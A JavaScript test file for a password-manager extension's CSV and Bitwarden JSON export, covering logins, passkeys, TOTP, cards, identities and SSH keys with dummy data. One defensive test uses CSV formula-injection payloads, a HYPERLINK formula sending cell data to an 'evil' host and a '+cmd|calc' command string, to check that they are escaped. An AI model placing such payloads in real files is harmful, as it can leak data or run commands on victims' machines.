import { test } from 'node:test';
import assert from 'node:assert/strict';
import { toCsv, CSV_COLUMNS, totpUri, noFormula, templateEntries } from '../../extension/src/lib/export/csv.js';
import { toBitwardenJson, bitwardenCredentialId } from '../../extension/src/lib/export/bitwarden.js';
import { csvToObjects } from '../../extension/src/lib/import/csv.js';
import { parseOtpauthUri } from '../../extension/src/lib/totp.js';
import { makeItem, defaultData, passkeyFromImport } from '../../extension/src/lib/vault.js';
import { createCredential } from '../../extension/src/lib/webauthn.js';
import { toB64url, fromB64url, randomBytes } from '../../extension/src/shared/bytes.js';

const T0 = Date.UTC(2026, 0, 2, 3, 4, 5);
const T1 = Date.UTC(2026, 5, 6, 7, 8, 9);
const TOTP = { secret: 'JBSWY3DPEHPK3PXP', algorithm: 'SHA256', digits: 8, period: 60, issuer: 'GitHub', label: 'hina' };

async function sampleData() {
  const cred = await createCredential({ rpId: 'github.com', userHandle: randomBytes(16), clientDataHash: randomBytes(32) });
  const passkey = {
    credentialId: toB64url(cred.credentialId), rpId: 'github.com', userHandle: toB64url(randomBytes(16)),
    userName: 'hina', userDisplayName: 'Hina', privateKey: toB64url(cred.privateKey), publicKey: toB64url(cred.cosePublicKey),
    alg: -7, signCount: 0, createdAt: T0, lastUsedAt: null,
  };
  const data = defaultData(T1);
  data.items.push(
    makeItem({
      title: 'GitHub', url: 'https://github.com/login', username: 'hina@example.jp', password: 'p@ss, "quoted"\nline',
      totp: TOTP, fav: true, vault: 'work', passkeys: [passkey], createdAt: T0, updatedAt: T1,
    }, T1),
    makeItem({ type: 'note', title: '金庫の暗証番号', note: '1234\n二行目', vault: 'family', createdAt: T0, updatedAt: T0 }, T1),
    makeItem({ title: 'No URL', username: ' spaced ', password: '', totp: { ...TOTP, label: '', issuer: '' } }, T1),
    makeItem({ title: 'Orphan', url: 'https://orphan.example', vault: 'gone' }, T1),
  );
  return { data, passkey, cred };
}

test('toCsv: Chrome-compatible header, every item (notes too), TOTP as otpauth URI, vault name, favorite', async () => {
  const { data } = await sampleData();
  const csv = toCsv(data);
  assert.ok(csv.startsWith('name,url,username,password,note,totp,vault,favorite\r\n'));
  assert.deepEqual(CSV_COLUMNS, ['name', 'url', 'username', 'password', 'note', 'totp', 'vault', 'favorite']);
  assert.ok(!csv.includes('BEGIN PRIVATE') && !csv.includes(data.items[0].passkeys[0].privateKey), 'no passkey keys in CSV');

  const { headers, records } = csvToObjects(csv);
  assert.deepEqual(headers, CSV_COLUMNS);
  assert.equal(records.length, 4);
  const [gh, note, nourl, orphan] = records;
  assert.deepEqual({ ...gh, totp: undefined }, {
    name: 'GitHub', url: 'https://github.com/login', username: 'hina@example.jp', password: 'p@ss, "quoted"\nline',
    note: '', totp: undefined, vault: '仕事', favorite: 'true',
  });
  assert.deepEqual(parseOtpauthUri(gh.totp), TOTP);
  assert.deepEqual(note, {
    name: '金庫の暗証番号', url: '', username: '', password: '', note: '1234\n二行目', totp: '', vault: '家族', favorite: 'false',
  });
  assert.equal(nourl.username, ' spaced ', 'surrounding spaces survive (quoted)');
  assert.equal(parseOtpauthUri(nourl.totp).label, 'spaced', 'empty TOTP label falls back to the username');
  assert.equal(orphan.vault, 'gone', 'unknown vault id kept as-is');
});

test('totpUri: empty without TOTP', () => {
  assert.equal(totpUri({ totp: null }), '');
});

test('toBitwardenJson: unencrypted export shape, folders from vaults, login/secure note, TOTP, favorite, dates', async () => {
  const { data } = await sampleData();
  const out = JSON.parse(toBitwardenJson(data));
  assert.equal(out.encrypted, false);
  assert.deepEqual(out.folders, [{ id: 'personal', name: '個人' }, { id: 'work', name: '仕事' }, { id: 'family', name: '家族' }]);
  assert.equal(out.items.length, 4);
  const [gh, note, nourl, orphan] = out.items;

  assert.equal(gh.id, data.items[0].id);
  assert.equal(gh.type, 1);
  assert.equal(gh.folderId, 'work');
  assert.equal(gh.name, 'GitHub');
  assert.equal(gh.notes, null);
  assert.equal(gh.favorite, true);
  assert.equal(gh.creationDate, new Date(T0).toISOString());
  assert.equal(gh.revisionDate, new Date(T1).toISOString());
  assert.equal(gh.login.username, 'hina@example.jp');
  assert.equal(gh.login.password, 'p@ss, "quoted"\nline');
  assert.deepEqual(gh.login.uris, [{ match: null, uri: 'https://github.com/login' }]);
  assert.deepEqual(parseOtpauthUri(gh.login.totp), TOTP);
  assert.equal(gh.secureNote, undefined);

  assert.equal(note.type, 2);
  assert.deepEqual(note.secureNote, { type: 0 });
  assert.equal(note.notes, '1234\n二行目');
  assert.equal(note.folderId, 'family');
  assert.equal(note.login, undefined);
  assert.equal(note.fields, undefined);

  assert.deepEqual(nourl.login.uris, []);
  assert.equal(nourl.login.password, null);
  assert.equal(nourl.folderId, 'personal');
  assert.equal(orphan.folderId, null, 'unknown vault → no folder');
});

test('toBitwardenJson: passkeys → fido2Credentials (Bitwarden shape, PKCS8 keyValue) that import back', async () => {
  const { data, passkey, cred } = await sampleData();
  const [fido] = JSON.parse(toBitwardenJson(data)).items[0].login.fido2Credentials;
  assert.deepEqual(fido, {
    credentialId: 'b64.' + passkey.credentialId,
    keyType: 'public-key',
    keyAlgorithm: 'ECDSA',
    keyCurve: 'P-256',
    keyValue: passkey.privateKey,
    rpId: 'github.com',
    userHandle: passkey.userHandle,
    userName: 'hina',
    counter: '0',
    rpName: 'github.com',
    userDisplayName: 'Hina',
    discoverable: 'true',
    creationDate: new Date(T0).toISOString(),
  });
  // The key is a usable PKCS8 P-256 key; importing derives the same COSE public key.
  const back = await passkeyFromImport({ ...passkey, privateKey: fido.keyValue, publicKey: undefined }, T1);
  assert.equal(back.publicKey, toB64url(cred.cosePublicKey));
});

test('bitwardenCredentialId: 16-byte ids as GUIDs, others as b64.<base64url>', () => {
  const id16 = toB64url(Uint8Array.from({ length: 16 }, (_, i) => i * 17));
  assert.equal(bitwardenCredentialId(id16), '00112233-4455-6677-8899-aabbccddeeff');
  const id32 = toB64url(randomBytes(32));
  assert.equal(bitwardenCredentialId(id32), 'b64.' + id32);
  assert.equal(fromB64url(bitwardenCredentialId(id32).slice(4)).length, 32);
});

test('toBitwardenJson: login fields on a secure note are kept as custom fields', () => {
  const data = defaultData(T1);
  data.items.push(makeItem({ type: 'note', title: 'Wi-Fi', url: 'https://router.local', username: 'admin', password: 'pw', note: 'n' }, T1));
  data.items.push(makeItem({ title: '' }, T1));
  const [note, untitled] = JSON.parse(toBitwardenJson(data)).items;
  assert.deepEqual(note.fields, [
    { name: 'url', value: 'https://router.local', type: 0, linkedId: null },
    { name: 'username', value: 'admin', type: 0, linkedId: null },
    { name: 'password', value: 'pw', type: 1, linkedId: null },
  ]);
  assert.equal(untitled.name, '--', 'Bitwarden needs a name');
});

test('empty vault exports a header-only CSV and an empty Bitwarden item list', () => {
  const data = defaultData(T1);
  assert.equal(toCsv(data), 'name,url,username,password,note,totp,vault,favorite\r\n');
  assert.deepEqual(JSON.parse(toBitwardenJson(data)).items, []);
});

test('toCsv: formula-looking name/url/note/vault cells get a leading quote; credentials are never altered', () => {
  const data = defaultData(T1);
  data.vaults.push({ id: 'evil', name: '@SUM(A1)', hue: 1 });
  const evil = '=HYPERLINK("https://evil/?"&D2,"open")';
  data.items.push(makeItem({
    title: evil, username: '=user', password: '-pass+', note: '+cmd|calc', vault: 'evil',
    totp: { secret: 'JBSWY3DPEHPK3PXP', label: '=label', issuer: '' },
  }, T1));
  data.items.push(makeItem({ title: '\tTab', note: '\rCR', username: '@me', password: '=1+1' }, T1));
  data.items.push(makeItem({ title: 'plain - title', note: 'a=b', password: 'x' }, T1));
  const [a, b, c] = csvToObjects(toCsv(data)).records;
  assert.equal(a.name, "'" + evil);
  assert.equal(a.note, "'+cmd|calc");
  assert.equal(a.vault, "'@SUM(A1)");
  assert.deepEqual([a.username, a.password], ['=user', '-pass+'], 'username/password exported as-is');
  assert.match(a.totp, /^otpauth:\/\//);
  assert.equal(b.name, "'\tTab");
  assert.equal(b.note, "'\rCR");
  assert.deepEqual([b.username, b.password], ['@me', '=1+1']);
  assert.deepEqual([c.name, c.note], ['plain - title', 'a=b'], 'only a leading character triggers it');

  for (const ch of ['=', '+', '-', '@', '\t', '\r']) assert.equal(noFormula(ch + 'x'), "'" + ch + 'x');
  for (const s of ['', 'x', ' =x', "'=x", ',', '0', 'https://a']) assert.equal(noFormula(s), s);
  assert.equal(noFormula(null), '');
});

// ---- item types (shared/item-types.js) ---------------------------------------

function typedData() {
  const data = defaultData(T1);
  const extra = [{ label: '暗証', value: '0000', secret: true }, { label: '担当', value: '山田', secret: false }];
  data.items.push(
    makeItem({
      type: 'card', title: 'Amex', note: 'メインカード', fav: true, vault: 'work', createdAt: T0, updatedAt: T1,
      fields: { cardholder: 'HINA SATO', number: '3782 822463 10005', expiry: '2030-04', cvv: '1234', pin: '9876' }, extra,
    }, T1),
    makeItem({
      type: 'identity', title: '自分',
      fields: {
        lastName: '佐藤', firstName: 'ひな', middleName: 'M', email: 'hina@example.jp', phone: '090-1234-5678', birthDate: '1990-01-02',
        company: 'ACME', jobTitle: '技師', postalCode: '100-0001', country: 'JP', state: '東京都', city: '千代田区',
        address1: '千代田 1-1', address2: '101', website: 'https://hina.example',
      },
    }, T1),
    makeItem({
      type: 'sshKey', title: 'deploy',
      fields: {
        privateKey: '-----BEGIN OPENSSH PRIVATE KEY-----\nAAAA\n-----END OPENSSH PRIVATE KEY-----', publicKey: 'ssh-ed25519 AAAA hina@pc',
        fingerprint: 'SHA256:abc', passphrase: 'pp', host: 'git.example', username: 'git',
      },
    }, T1),
    makeItem({ type: 'wifi', title: 'Home', fields: { ssid: 'Home-5G', password: 'wifi pw', security: 'wpa2' } }, T1),
    makeItem({ type: 'database', title: 'DB', note: 'prod', fields: { host: 'db.example', port: '5432', password: '=pw' }, extra }, T1),
    makeItem({ type: 'card', title: 'Blank card', fields: {} }, T1),
    makeItem({ title: 'Login with extra', url: 'https://a.example', username: 'u', password: 'p', extra }, T1),
  );
  return { data, extra };
}

const cf = (name, value, type) => ({ name, value, type, linkedId: null });

test('toBitwardenJson: card, identity and SSH key use Bitwarden\'s native types', () => {
  const { data } = typedData();
  const [card, identity, ssh, , , blank] = JSON.parse(toBitwardenJson(data)).items;

  assert.equal(card.type, 3);
  assert.deepEqual(card.card, {
    cardholderName: 'HINA SATO', brand: 'Amex', number: '378282246310005', expMonth: '4', expYear: '2030', code: '1234',
  });
  assert.deepEqual([card.name, card.notes, card.favorite, card.folderId], ['Amex', 'メインカード', true, 'work']);
  assert.deepEqual(card.fields, [cf('akari:type', 'card', 0), cf('PIN', '9876', 1), cf('暗証', '0000', 1), cf('担当', '山田', 0)], 'type marker, then PIN and extra as custom fields');
  assert.equal(card.login, undefined);
  assert.equal(card.secureNote, undefined);
  assert.deepEqual(blank.card, { cardholderName: null, brand: null, number: null, expMonth: null, expYear: null, code: null });
  assert.equal(blank.notes, null, 'an empty note stays empty');
  assert.deepEqual(blank.fields, [cf('akari:type', 'card', 0)], 'the type marker is written even with no other custom field');

  assert.equal(identity.type, 4);
  assert.deepEqual(identity.identity, {
    title: null, firstName: 'ひな', middleName: 'M', lastName: '佐藤', address1: '千代田 1-1', address2: '101', city: '千代田区',
    state: '東京都', postalCode: '100-0001', country: 'JP', company: 'ACME', email: 'hina@example.jp', phone: '090-1234-5678',
    address3: null, ssn: null, username: null, passportNumber: null, licenseNumber: null,
  });
  assert.deepEqual(identity.fields, [cf('akari:type', 'identity', 0), cf('生年月日', '1990-01-02', 0), cf('役職', '技師', 0), cf('ウェブサイト', 'https://hina.example', 0)]);

  assert.equal(ssh.type, 5);
  assert.deepEqual(ssh.sshKey, {
    privateKey: '-----BEGIN OPENSSH PRIVATE KEY-----\nAAAA\n-----END OPENSSH PRIVATE KEY-----',
    publicKey: 'ssh-ed25519 AAAA hina@pc', keyFingerprint: 'SHA256:abc',
  });
  assert.deepEqual(ssh.fields, [cf('akari:type', 'sshKey', 0), cf('パスフレーズ', 'pp', 1), cf('ホスト', 'git.example', 0), cf('ユーザー名', 'git', 0)]);
});

test('toBitwardenJson: other types → secure note with template custom fields; extra on any type', () => {
  const { data } = typedData();
  const items = JSON.parse(toBitwardenJson(data)).items;
  const [wifi, db, login] = [items[3], items[4], items[6]];
  assert.equal(wifi.type, 2);
  assert.deepEqual(wifi.secureNote, { type: 0 });
  assert.equal(wifi.notes, null, 'notes is only ever the item note, never the type name');
  assert.ok(items.every((it, i) => it.notes === (data.items[i].note || null)), 'no item gets text written into notes');
  // The type marker is on every item that is neither login nor note, native Bitwarden types included.
  assert.deepEqual(items.map((it) => it.fields?.find((x) => x.name === 'akari:type')?.value ?? null),
    data.items.map((it) => (it.type === 'login' || it.type === 'note' ? null : it.type)));
  assert.deepEqual(wifi.fields, [cf('akari:type', 'wifi', 0), cf('ネットワーク名', 'Home-5G', 0), cf('パスワード', 'wifi pw', 1), cf('セキュリティ', 'WPA2', 0)],
    'secret kinds hidden, select written as its label');
  assert.equal(db.notes, 'prod', 'an existing note is left alone');
  assert.deepEqual(db.fields, [
    cf('akari:type', 'database', 0),
    cf('ホスト', 'db.example', 0), cf('ポート', '5432', 0), cf('パスワード', '=pw', 1), cf('暗証', '0000', 1), cf('担当', '山田', 0),
  ]);
  assert.equal(login.type, 1);
  assert.deepEqual(login.fields, [cf('暗証', '0000', 1), cf('担当', '山田', 0)], 'no type marker on logins');
  // No item of any type leaks Akari's internal keys.
  for (const it of items) for (const k of ['extra', 'vault', 'hue']) assert.ok(!(k in it), k);
});

test('toCsv: other types keep the columns; template and custom fields become "label: value" lines in the note', () => {
  const { data } = typedData();
  const csv = toCsv(data);
  const { headers, records } = csvToObjects(csv);
  assert.deepEqual(headers, CSV_COLUMNS);
  const by = new Map(records.map((r) => [r.name, r]));
  assert.deepEqual(by.get('Amex'), {
    name: 'Amex', url: '', username: '', password: '',
    note: 'メインカード\n\n名義: HINA SATO\nカード番号: 3782 822463 10005\n有効期限: 2030-04\nセキュリティコード: 1234\nPIN: 9876\n暗証: 0000\n担当: 山田',
    totp: '', vault: '仕事', favorite: 'true',
  });
  assert.equal(by.get('Home').note, 'ネットワーク名: Home-5G\nパスワード: wifi pw\nセキュリティ: WPA2');
  assert.equal(by.get('deploy').note.split('\n')[0], '秘密鍵: -----BEGIN OPENSSH PRIVATE KEY-----');
  assert.equal(by.get('Blank card').note, '');
  const login = by.get('Login with extra');
  assert.deepEqual([login.url, login.username, login.password, login.note], ['https://a.example', 'u', 'p', '暗証: 0000\n担当: 山田']);

  // Formula escaping still applies to the combined note cell.
  const evil = defaultData(T1);
  evil.items.push(makeItem({ type: 'wifi', title: 'x', fields: { ssid: '=cmd' } }, T1));
  evil.items.push(makeItem({ type: 'apiCredential', title: '@x', fields: { keyId: 'k' }, extra: [{ label: '+l', value: 'v', secret: false }] }, T1));
  const [a, b] = csvToObjects(toCsv(evil)).records;
  assert.equal(a.note, 'ネットワーク名: =cmd', 'a label leads the line, so it is not a formula');
  assert.equal(b.name, "'@x");
  evil.items.push(makeItem({ type: 'note', title: 'n', note: '', extra: [{ label: '', value: '=HYPERLINK("x")', secret: false }] }, T1));
  assert.equal(csvToObjects(toCsv(evil)).records[2].note, '\'=HYPERLINK("x")');
});

test('templateEntries: template order, non-empty values, select ids as labels', () => {
  const item = makeItem({ type: 'wifi', fields: { security: 'none', ssid: 'Cafe' } }, T1);
  assert.deepEqual(templateEntries(item), [
    { key: 'ssid', label: 'ネットワーク名', value: 'Cafe', secret: false },
    { key: 'security', label: 'セキュリティ', value: 'なし', secret: false },
  ]);
  assert.deepEqual(templateEntries(makeItem({ type: 'note' }, T1)), []);
  assert.deepEqual(templateEntries(makeItem({}, T1)), []);
});

test('previous passwords: Bitwarden passwordHistory in its own shape, never in the CSV', async () => {
  const { data } = await sampleData();
  data.items[0].passwordHistory = [{ password: 'old-one', changedAt: T1 }, { password: 'older', changedAt: T0 }];
  const bw = JSON.parse(toBitwardenJson(data)).items;
  assert.deepEqual(bw[0].passwordHistory, [
    { lastUsedDate: new Date(T1).toISOString(), password: 'old-one' },
    { lastUsedDate: new Date(T0).toISOString(), password: 'older' },
  ]);
  assert.equal(bw[1].passwordHistory, null, 'none for a note');
  assert.ok(!toCsv(data).includes('old-one'), 'the CSV has only the current password');
});
